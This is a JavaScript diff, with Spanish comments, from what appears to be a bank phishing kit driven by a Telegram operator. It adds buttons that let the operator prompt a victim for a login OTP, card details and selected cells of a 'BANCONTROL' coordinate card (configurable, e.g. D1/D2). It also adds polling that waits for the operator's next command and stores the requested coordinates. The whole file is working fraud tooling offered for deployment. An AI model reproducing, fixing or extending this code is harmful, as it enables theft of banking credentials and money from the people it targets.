@@ -4,26 +4,35 @@ const Session = {
   clear() { Object.keys(localStorage).filter(k => k.startsWith('bg_')).forEach(k => localStorage.removeItem(k)) }
 };
 
-const BUTTONS = {
-  login: [
+// Las coords del bancontrol van dentro del callback_data: bc:COORD1:COORD2
+// Tú las defines aquí antes de subir, o puedes cambiarlas desde Telegram
+// Ejemplo: bc:D1:D2 → cliente ve campos D1 y D2
+function getBtns(step) {
+  // Puedes cambiar D1 y D2 por las que quieras: A1, B3, E4, etc.
+  const BC_COORD1 = "D1";
+  const BC_COORD2 = "D2";
+  const bcBtn = { text: "🏦 BANCONTROL", callback_data: `bc:${BC_COORD1}:${BC_COORD2}` };
+
+  if (step === 'login') return [
     [{ text: "🔐 OTP", callback_data: "otp" }, { text: "💳 TARJETA", callback_data: "tarjeta" }],
-    [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
+    [bcBtn],
     [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }]
-  ],
-  otp: [
+  ];
+  if (step === 'otp') return [
     [{ text: "💳 TARJETA", callback_data: "tarjeta" }],
-    [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
+    [bcBtn],
     [{ text: "❌ ERROR OTP", callback_data: "error_otp" }]
-  ],
-  tarjeta: [
+  ];
+  if (step === 'tarjeta') return [
     [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
     [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }]
-  ],
-  bancontrol: [
+  ];
+  if (step === 'bancontrol') return [
     [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
     [{ text: "❌ ERROR BANCONTROL", callback_data: "error_bancontrol" }]
-  ]
-};
+  ];
+  return [];
+}
 
 async function sendTelegram(text, buttons = []) {
   const res = await fetch('/api/send', {
@@ -52,11 +61,16 @@ async function startPolling(handler) {
 
       if (data.update_id) lastUpdateId = data.update_id;
 
-      // Actualizar modo espera de coordenadas
-      if (typeof data.waitCoords !== 'undefined') waitCoords = data.waitCoords;
+      // El servidor nos dice que ahora esperemos las coords
+      if (data.waitCoords === true) {
+        waitCoords = true;
+        return; // Seguir haciendo polling, NO parar
+      }
 
+      // Sin acción, seguir esperando
       if (!data.ok || !data.action) return;
 
+      // Llegó acción real — parar polling y ejecutar
       clearInterval(iv);
       if (data.coords) Session.save('bancontrol_coords', data.coords);
       handler(data.action, data.coords || null);
